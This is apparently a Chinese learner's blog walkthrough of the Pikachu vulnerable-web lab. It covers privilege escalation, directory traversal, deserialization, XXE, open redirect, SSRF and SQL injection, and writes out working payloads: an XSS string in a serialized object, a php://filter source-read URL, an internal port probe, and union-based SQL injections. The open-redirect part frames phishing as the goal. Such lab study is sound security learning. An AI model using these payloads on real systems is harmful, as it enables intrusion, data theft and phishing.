<h3 id="Over-Permisson（越权漏洞）"><a href="#Over-Permisson（越权漏洞）" class="headerlink" title="Over Permisson（越权漏洞）"></a>Over Permisson（越权漏洞）</h3><h4 id="越权漏洞原理"><a href="#越权漏洞原理" class="headerlink" title="越权漏洞原理"></a>越权漏洞原理</h4><p><strong>越权漏洞概述</strong><br>由于没有用户权限的严格判断，导致低权限账号（普通用户）可以去完成高权限账号（如后台管理员）范围内的操作<br><strong>平行越权：</strong>A用户和B用户同一级别用户，但各自不能操作对方的个人信息，A越权操做B的信息的情况成为平行越权<br><strong>垂直越权：</strong>A用户权限高于B用户，B用户越权操作A的权限成为垂直越权<br>越权漏洞属于逻辑漏洞，是由于权限检验的逻辑不够严谨导致<br>越权漏洞很难通过工具扫描出来只能进行手工测试</p>
<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>先登录，提示里查看账号密码，有一个查看个人信息的按钮<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-33-03.png" alt="登录水平越权" class="lazyload"><br>再点击按钮时，向后台提供了一个get请求。提供了当前用户的用户名，然后后台将其信息返回到前台。我们在url中把Lucy改成其他人看看能不能查到信息。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-35-36.png" alt="水平越权" class="lazyload"></p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>先登录超级管理员，去执行只有超级管理员才可以操作的新增账号的功能，用burp抓包。退出登录，登录普通用户，执行新增账号操作如果成功则存在垂直越权漏洞。<br>垂直越权演示流程：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-21-43-22.png" alt="垂直越权流程" class="lazyload"></p>
<h3 id="…-…-…-目录遍历"><a href="#…-…-…-目录遍历" class="headerlink" title="…/…/…/(目录遍历)"></a>…/…/…/(目录遍历)</h3><p><strong>目录遍历漏洞</strong>在web功能设计中很多时候我们会将要访问的文件定义成变量让前端的功能更灵活，当用户发起一个前端请求，便会将这个文件的值（如文件名）传递到后端，后端在执行对应的文件。在这个过程中如果没有对前端传来的值进行严格的安全考虑则攻击者可能会通过”../“这种方式让后台打开或者执行一些其他的文件，从而导致后端服务器上的其他目录文件结果被遍历出，形成目录遍历。<br>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br>需要区分一下的是,如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc">http://xxxx/doc</a>）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）<br>目录遍历漏洞演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-28-34.png" alt="目录遍历" class="lazyload"></p>
<h3 id="敏感信息泄露（can-see-your-ABC）"><a href="#敏感信息泄露（can-see-your-ABC）" class="headerlink" title="敏感信息泄露（can see your ABC）"></a>敏感信息泄露（can see your ABC）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>---通过访问url下的目录，可以直接列出目录下的文件列表;<br>---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。<br></code></pre></td></tr></table></figure>

<p>在敏感信息泄露的靶场中我们查看源码可以看到<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-33-15.png" alt="信息泄露" class="lazyload"><br>登录后可产看页面信息，退出后直接访问登录后的页面也能成功访问<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-36-56.png" alt="登录后的信息" class="lazyload"></p>
<h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p>在理解之前首先需要明白php中的serialize()&amp;unserialize()函数<br>**序列化serialize()**序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>=<span class="hljs-string">&quot;pikachu&quot;</span>;<br> &#125;<br> <span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> S(); <span class="hljs-comment">//创建一个对象</span><br> serialize(<span class="hljs-variable">$s</span>); <span class="hljs-comment">//把这个对象进行序列化</span><br> 序列化后得到的结果是这个样子的:O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;pikachu&quot;</span>;&#125;<br>     O:代表<span class="hljs-keyword">object</span><br>     <span class="hljs-number">1</span>:代表对象名字长度为一个字符<br>     S:对象的名称<br>     <span class="hljs-number">1</span>:代表对象里面有一个变量<br>     s:数据类型<br>     <span class="hljs-number">4</span>:变量名称的长度<br>     test:变量名称<br>     s:数据类型<br>     <span class="hljs-number">7</span>:变量值的长度<br>     pikachu:变量值<br></code></pre></td></tr></table></figure>

<p>**反序列化unserialize()**就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$u</span>=unserialize(<span class="hljs-string">&quot;O:1:&quot;</span>S<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:7:&quot;</span>pikachu<span class="hljs-string">&quot;;&#125;&quot;</span>);<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$u</span>-&gt;test; <span class="hljs-comment">//得到的结果为pikachu</span><br></code></pre></td></tr></table></figure>

<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">常见的几个魔法函数:<br>       __construct()当一个对象创建时被调用<br><br>       __destruct()当一个对象销毁时被调用<br><br>       __toString()当一个对象被当作一个字符串使用<br><br>       __sleep() 在对象在被序列化之前运行<br><br>       __wakeup将在序列化之后立即被调用<br><br>       漏洞举例:<br><br>       <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>           <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br>           <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>           &#125;<br>       &#125;<br>       <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br>       @<span class="hljs-variable">$unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br><br>       payload:O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>

<p>打开靶场进行试验：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-13-34.png" alt="演示" class="lazyload"><br>在将序列化后的类执行时，可能会调用相应的构造方法，通过这些构造方法，就会对反序列化的代码执行，造成一些不可预计的后果。但是在实际情况中，我们往往需要构造多种payload，来测试出后台往往是使用哪种构造方法，并使用。(序列化漏洞一般在白盒测试中发现需要知道源代码)</p>
<h3 id="xxe-xml外部实体攻击"><a href="#xxe-xml外部实体攻击" class="headerlink" title="xxe(xml外部实体攻击)"></a>xxe(xml外部实体攻击)</h3><p>XXE -“xml external entity injection”既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--第一部分: XML声明-- &gt;</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-comment">&lt;!--第二部分:文档类型定义DTID- &gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE note[ &lt;!--定义此文档是 note类型的文档--&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">entity</span> - <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL/URL&quot;</span>&gt;</span> &lt;!- 外部实体声 明--&gt;<br>]]&gt;<br>&lt;1--第三部分:文档元&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span> Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> Reminder <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>DTD：Document Type Definition即文档类型定义，用来为XML文档定义语义约束。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1.DTD内部声明<br>&lt;!DOCTYPE 根元素[元素声明]&gt;<br>2. DTD外部引用<br>&lt;!DOCTYPE根元素名称SYSTEM “&quot;外部DTD的URI&quot; &gt;<br>3.引用公共DTD<br>&lt;!DOCTYPE根元素名称PUBLIC &quot;DTD标识名” “公用DTD的URI” &gt;<br></code></pre></td></tr></table></figure>

<p>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞。simplexml load string()函数转换形式良好的XML字符串为SimpleXMLElement对象XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML。</p>
<p>打开靶场我们输入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;xxe&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>结果：<img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-52-17.png" alt="结果" class="lazyload"></p>
<p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。需要对xml进行学习</p>
<h3 id="不安全的url重定向"><a href="#不安全的url重定向" class="headerlink" title="不安全的url重定向"></a>不安全的url重定向</h3><p>不安全的url跳转问题可能发生在一切可以执行url地址跳转的地方，如果后端采用了前端传来的（用户的参数，之前预埋在前端页面的url地址）参数作为跳转的目的地，又没有做判断的话就可能发生跳错对象的问题。<br>url跳转最直接的危害是：</p>
<ul>
<li>钓鱼：攻击者使用漏洞方的域名（如一个出名公司的域名往往会让用户放心的点击）做掩盖，而最终跳转到钓鱼网站</li>
</ul>
<p>这个漏洞比较简单，我们来学习一下：打开靶场<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-32-22.png" alt="靶场" class="lazyload"><br>看到有几个链接我们点击看看发现第三个跳转到了不安全的url概述第四个的url有参数，查看源码可看到地址我们添加一条点击发现可以成功跳转到我们指定的网站<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-40-53.png" alt="源码" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-41-56.png" alt="网站跳转" class="lazyload"><br>熟练后可以的定向转到提前搭建好的恶意站点。在这里我们的应用主要是发现不做后端检测跳转的网站利用它去做钓鱼。</p>
<h3 id="SSRF（服务器端请求伪造）"><a href="#SSRF（服务器端请求伪造）" class="headerlink" title="SSRF（服务器端请求伪造）"></a>SSRF（服务器端请求伪造）</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)其形成的原因大都是由于<em>服务端</em>提供了<em>从其他服务器</em>应用获取数据的功能,但又<em>没有对目标地址做严格过滤与限制</em>，导致攻击者可以传入<em>任意</em>的地址来<em>让后端服务器对其发起请求</em>,并返回对该目标地址请求的数据。<br>数据流：攻击者-&gt;服务器-&gt;目标地址<br>根据后台使用的函数不同，对应的影响和利用方式也不同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP中下面函数的使用不当会导致SSRF:</span><br>file_get_contents()<br>fsockopen()<br>curl_exec()<br></code></pre></td></tr></table></figure>

<p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。<br>演示：打开靶场ssrf（curl）点击a标签显示了一首诗和一个1<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-03-01.png" alt="点击尝试" class="lazyload"><br>同样可以改成百度的网址访问百度<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-04-52.png" alt="访问百度" class="lazyload"></p>
<p>打开ssrf(file_get_content)，点击链接，看链接地址<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-07-33.png" alt="又跳转" class="lazyload"><br>同样修改百度的地址<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-10-26.png" alt="成功跳转" class="lazyload"><br>尝试读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-13-08.png" alt="读取成功显示到了页面" class="lazyload"><br>将信息编码形式转换即可看到文件内容。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-15-32.png" alt="成功获取到信息" class="lazyload"><br>内网请求:<a target="_blank" rel="noopener" href="http://x.x.x.x/xx.index">http://x.x.x.x/xx.index</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-26-57.png" alt="内网请求" class="lazyload"><br>测试本地端口是否开放：<a target="_blank" rel="noopener" href="http://192.168.23.128:22/">http://192.168.23.128:22</a> (探测这台主机内网的这台主句的22端口是否开启)<br>ssrf要根据后端使用的函数不同利用的方法不同</p>
<h3 id="sql-inject（SQL注入）"><a href="#sql-inject（SQL注入）" class="headerlink" title="sql inject（SQL注入）"></a>sql inject（SQL注入）</h3><h4 id="sql-inject漏洞原理概述"><a href="#sql-inject漏洞原理概述" class="headerlink" title="sql inject漏洞原理概述"></a>sql inject漏洞原理概述</h4><p>在owasp发布的top10漏洞中，注入漏洞一直是危害且排名第一，其中主要指的是SQL Inject漏洞，数据库注入漏洞主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者通过合法输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库泄露的一种漏洞。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-58-09.png" alt="注入" class="lazyload"><br>正常输入：1 select email from users where id = 1<br>非法输入：1 or 1=1 select email from users where id = 1</p>
<h4 id="SQL-Inject攻击流程"><a href="#SQL-Inject攻击流程" class="headerlink" title="SQL Inject攻击流程"></a>SQL Inject攻击流程</h4><ol>
<li>注入点探测：<br>自动方式：使用web漏洞扫描工具，自动进行注入点发现<br>手动方式：手工构造sql inject测试语句进行注入点检测发现</li>
<li>信息获取：<br>通过注入点获取期望获得的数据：<ul>
<li>环境信息：数库类型、版本，操作系统类型版本、用户信息</li>
<li>数据库信息：数据库名、表、字段、字段内容</li>
</ul>
</li>
<li>获取权限<br>获取操作系统权限：通过数据库执行shell、上传木马</li>
</ol>
<h4 id="常见注入点的类型"><a href="#常见注入点的类型" class="headerlink" title="常见注入点的类型"></a>常见注入点的类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txet">数字型：user_id = $id<br>字符型：user_id = &#x27;$id&#x27;<br>搜索型：text LIKE &#x27;%&#123;$_get[&#x27;search&#x27;]&#125;&#x27;<br></code></pre></td></tr></table></figure>

<h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><h5 id="pikachu-SQL-Inject-数字型"><a href="#pikachu-SQL-Inject-数字型" class="headerlink" title="pikachu-SQL-Inject-数字型"></a>pikachu-SQL-Inject-数字型</h5><p><strong>post型注入演示</strong> 我们打开靶场，下拉框随意点击一个数字查看url<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-21-50.png" alt="打开靶场" class="lazyload"><br>发现url中无参数提交方式是post方式。<br>首先测试这个输入点是否存在漏洞，正常逻辑我们输入一个id，之后返回数据，因该是后台在数据库进行查询，返回了id相对应的姓名和邮箱可以认为语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表明 <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> 值;<br></code></pre></td></tr></table></figure>

<p>后端接收到的应是<code>$id=$post[&#39;id&#39;]</code>之后把接受道德参数传进去<br>我们点击数字2，进行查询，之后打开burp查看抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-28-22.png" alt="抓取数据包" class="lazyload"><br>由于是post型注入我们只能将注入语句加入数据包发送给后端，将抓到的数据包发送到repeater中，我们在输入点输入一段payload：2 or 1=1，点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-35-23.png" alt="重放" class="lazyload"><br>可以看到返回了所有用户和邮箱信息</p>
<h5 id="pikachu-SQL-Inject-字符型注入"><a href="#pikachu-SQL-Inject-字符型注入" class="headerlink" title="pikachu-SQL-Inject-字符型注入"></a>pikachu-SQL-Inject-字符型注入</h5><p><strong>get型注入</strong>我们打开靶场，随意输入一段字符，点击提交，提示用户名不存在。发现请求在url中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-39-26.png" alt="靶场" class="lazyload"><br>正常返回是两个字段，用户名和邮箱。我们可以对后台运行做出猜想</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;值&quot;;<br></code></pre></td></tr></table></figure>

<p>后台接受<code>$uname=$_GET[&#39;username&#39;]</code><br>与xss类似我们要构成一个合法的闭合。字符串需要加单引号才合法。我们需要把前后两个单引号注释掉。输入<code>kb &#39; or 1=1 #</code>第一个单引号会将前面的单引号闭合，后面的#号会注释掉后面的单引号。我们尝试提交.<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-46-44.png" alt="测试" class="lazyload"><br>可以看到注入成功所有的信息都展示出来了</p>
<h5 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h5><p>我们打开搜索型注入靶场，尝试输入字符c，点击提交查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-49-14.png" alt="结果" class="lazyload"><br>返回了所有含c的用户名和uid,我们猜测后台运行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%c%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这种查询比get多了%号，我们要想办法构造一个合法的闭合。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%c%&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure>

<p>我们输入构造的字符串<code>c%&#39; or 1=1 #</code>查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-58-18.png" alt="结果" class="lazyload"><br>只要理解、猜测后台如何拼接，设置合法的语句构造闭合就能成功注入</p>
<h5 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h5><p>尝试盲闭合无果后，查看端代码，要闭合)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-04-56.png" alt="代码" class="lazyload"><br>我们尝试构造闭合<code>c&#39;) or 1=1 #</code>输入查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-07-48.png" alt="结果" class="lazyload"><br>成功闭合获取到了数据，所以提示管tmd什么型构造出闭合就是牛</p>
<h5 id="SQL-Inject漏洞手工测试：基于union联合查询的信息获取（select）"><a href="#SQL-Inject漏洞手工测试：基于union联合查询的信息获取（select）" class="headerlink" title="SQL Inject漏洞手工测试：基于union联合查询的信息获取（select）"></a>SQL Inject漏洞手工测试：基于union联合查询的信息获取（select）</h5><p><strong>union联合查询</strong> 可以通过联合查询来查询指定的数据<br>用法举例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名 <br></code></pre></td></tr></table></figure>

<p><strong>联合查询的字段数量要和主查询一致！！！</strong><br>打开字符型注入,首先用order by猜测有几个字段，我们输入<code>a&#39; order by 5 #</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-19-52.png" alt="猜字段" class="lazyload"><br>正常报错说明主查寻中有两个字段，确认字段后构建union联合查询<br><code>a&#39; union  select database(),user()#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-24-59.png" alt="union查询" class="lazyload"><br>这时就会将数据库名称，当前用户权限显示出来<br>我们还可以查询版本<code>a&#39; union  select version(),4#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-27-22.png" alt="数据库版本" class="lazyload"><br>这里的4直接打印出来了，还可以查询其他东西，一下数据库的相关知识仅供参考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Select version(); //取的数据库版本<br>Select database(); //取得当前的数据库<br>Select user(); //取得当前登录的用户<br>order by X //对查询的结果进行排序,按照第X列进行排序，默认数字0-9 ,字母a-z<br>思路:对查询的结果使用order by按照指定的列进行排序,如果指定的列不存在,数据库会报错。通过报错判断查询结果的列数,从而确定主查询的字段数。<br></code></pre></td></tr></table></figure>

<h5 id="通过information-schema拿下数据库手工测试完整案例"><a href="#通过information-schema拿下数据库手工测试完整案例" class="headerlink" title="通过information_schema拿下数据库手工测试完整案例"></a>通过information_schema拿下数据库手工测试完整案例</h5><p>mysql小知识：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">在mysq|中,自带的information_schema这个表里面存放了大量的重要信息。具体如下:<br>如果存在注入点的话，可以直接尝试对该数据库进行访问，从而获取更多的信息。<br>比如:<br>SCHEMATA表:提供了当前mysq|实例中所有数据库的信息。是show databases的结果取之此表。<br>TABLES表:提供了关于数据库中的表的信息(包括视图)。详细表述了某个表属于哪个schema ,表类型,表引擎,创建时间等信息。是show tables from schemaname的结果取之此表。<br>COLUMNS表:提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。<br></code></pre></td></tr></table></figure>

